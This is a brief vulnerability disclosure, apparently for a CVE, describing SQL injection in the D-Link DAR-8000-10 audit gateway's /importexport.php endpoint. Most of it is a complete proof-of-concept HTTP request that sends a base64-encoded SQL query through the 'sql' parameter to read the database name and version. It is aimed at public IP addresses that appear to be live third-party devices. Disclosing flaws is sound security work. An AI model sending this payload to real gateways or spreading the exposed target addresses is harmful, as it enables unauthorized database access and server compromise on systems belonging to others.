The full version of the D-LINK DAR-8000-10 series online behavior audit gateway has an SQL injection vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-8000-10

Vulnerability Path ：/importexport.php
https://59.60.19.174:8443/
<img width="720" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/3077bde6-418e-4bd9-9e0e-1251eec7200b">



Construct POC and successfully obtain database name and version
```
GET /importexport.php?sql=c2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCk=&type=exportexcelbysql HTTP/1.1
Host: 60.22.74.195:8443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```
<img width="726" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/6bd1a8b3-dc6d-46c5-baff-f5a7e9fc8b62">
